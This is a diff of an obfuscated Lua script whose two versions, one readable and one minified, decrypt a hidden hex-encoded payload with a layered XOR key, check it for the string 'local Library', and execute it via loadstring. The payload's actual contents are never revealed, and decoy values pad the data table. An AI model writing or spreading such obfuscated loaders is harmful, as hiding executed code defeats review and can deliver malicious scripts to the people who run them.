@@ -1,53 +1,9 @@
---[[ Protected by Advanced Lua Obfuscator v3.0 ]]
 (function() 
-    local t = {605440, "LvHNbuwFqlqZp", 259091, "0a080b08064b20040c1d11030b5349551a18191d0935302a2a226e2029242f7104393a3f1734267b763d2223282a601f1e4052437f353a203d23352d2a3f42525d38233d372e1e525d5e492f0d11221e0e35412211181c5c0610100457111f2026306b28272e266606222e1b7c613c2433717d7c7e7e5235585b5834790d595f565c43150b177450433242565c64714346212930606b022e34053b2d086b7205657b66796879601076405c431557177f5853240309485b48426601010c111d523e151c185745592d282c272b327c13292b62690422232a727858", true, "fAZDuZaatJkX", 650182, 591093, "_SQPJjFhynxR", "SifMIMnBW^ZlJy", 383600, 868158, false, "XO`WB]iQFAzlNIxAKU", 607022, "bZDzRmh[eEiK\\jg", "mKz^X", "XSpvvuc]Ug\\g", 155986, "NoNj_", false, 669497, "K[gfrz[nuVWXk", "W\\C]`QQnzohsTUvr_V_", "^fAYAWpk", 712341}
-    local v = { [1] = 4 }
-    local k = "202e302c2e343f2c223b2f43424142333f2f3d3d2512030f101a74777a7f0c0214080a1003101e070b6766656e1f136874766c67101e070b6766656e1f13687476090419150e6f030201502121312f2f333e2f23242e40434643303e203c3e1e110208111975787b7c0d05150b0b0f02131f000a64676a6f7171611d1d0563707e676b0706050e7f681866607a0d67667c1a74777a7f0c0214080a1003101e070b6766656e1f136874766c67747a63670b1172"
-    local function xorBytes(a, b)
-        local result = 0
-        local bit = 1
-        while a > 0 or b > 0 do
-            local a_bit = a % 2
-            local b_bit = b % 2
-            if a_bit ~= b_bit then
-                result = result + bit
-            end
-            a = math.floor(a / 2)
-            b = math.floor(b / 2)
-            bit = bit * 2
-        end
-        return result
-    end
-    
-    local function xorDecrypt(str, key)
-        local out = ''
-        for i = 1, #str, 2 do
-            local hex = string.sub(str, i, i+1)
-            local num = tonumber(hex, 16)
-            local keyChar = string.byte(key, ((i/2) - 1) % #key + 1)
-            local xorResult = xorBytes(num, keyChar)
-            out = out .. string.char(xorResult)
-        end
-        return out
-    end
-    
-    local function findPayload(data)
-        for _, item in pairs(data) do
-            if type(item) == 'string' and item:match('^%x+$') then
-                local decrypted = xorDecrypt(item, xorDecrypt(k, 'FIXED_SALT_2026'))
-                if decrypted and decrypted:find('local Library') then
-                    return decrypted
-                end
-            end
-        end
-        return nil
-    end
-    
-    local payload = findPayload(t)
-    if payload then
-        local func = loadstring(payload)
-        if func then
-            func()
-        end
-    end
+local t={false,125075,true,"]Cg[zTxptBRqZcB",601027,"27232e2f23701d3b312634242e78647a5c5e53574741100a0a024e0009040f5124191a1f3714065b561d0203080a406e6d3125326820213d223e2e383d2a22323d3d20303823763a355d1e7a564c7d435560166c0a0503411d1517015c1c1017130b5617202b2d6b092f251e7b6427392c6c6679797b59383a353634790d595f565c43150b17745043324239357719263e353d247c771e3220112f5269081362041807677a6b766d093d3f267232741237253c3c341003101a3e5959545955010d424d4b7e1b4e360b0d000a115d3c0808434e25010215535b79",567383,false,787829,469781,732283,"sxRueluxjjqkAhKdi",true,"tnzhW[GHkv","MuSxpPg_GX`nbI\\W",531216,true}
+local v={[1]=6}
+local k="0d05150b0b0f02131f000a64676a6f1c796977776b66232f303a54575a5f2c2234282a3023303e272b4746454e3f331907071b16070b1c16787b7e7b08060814160c07141a03076b6a0207747a6c7072686b786d3f335f5e5d46373b2b3131292439352e1e70737673000e100c0e141f0c021b0f63626162131f0f1d1d0563707e676b0706050e7f6818660f131e0f03040e60636663101e001c1e6f62737f606a04077b7c0d05150b0b0f02131f000a64676a6f1c796977776b66777b6c661370111263177e2b253d30252932385a59585d2a24362a342e213238212945484b"
+local function x(a,b) local r=0 local bit=1 while a>0 or b>0 do local ab=a%2 local bb=b%2 if ab~=bb then r=r+bit end a=math.floor(a/2) b=math.floor(b/2) bit=bit*2 end return r end
+local function d(str,key) local out='' for i=1,#str,2 do local hex=string.sub(str,i,i+1) local num=tonumber(hex,16) local kc=string.byte(key,((i/2)-1)%#key+1) out=out..string.char(x(num,kc)) end return out end
+local function f(data) for _,item in pairs(data) do if type(item)=='string' and item:match('^%x+$') then local dec=d(item,d(k,'FIXED_SALT_2026')) if dec and dec:find('local Library') then return dec end end end return nil end
+local payload=f(t) if payload then local func=loadstring(payload) if func then func() end end
 end)()
